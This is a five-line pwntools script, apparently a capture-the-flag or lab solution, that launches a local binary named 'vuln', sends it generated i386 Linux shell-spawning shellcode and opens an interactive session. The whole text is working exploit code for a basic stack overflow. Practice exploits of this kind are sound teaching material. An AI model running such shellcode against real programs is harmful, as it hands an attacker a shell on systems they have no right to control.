from pwn import *
s = process('./vuln')
shellcode = asm(shellcraft.i386.linux.sh())
s.sendline(shellcode)
s.interactive()
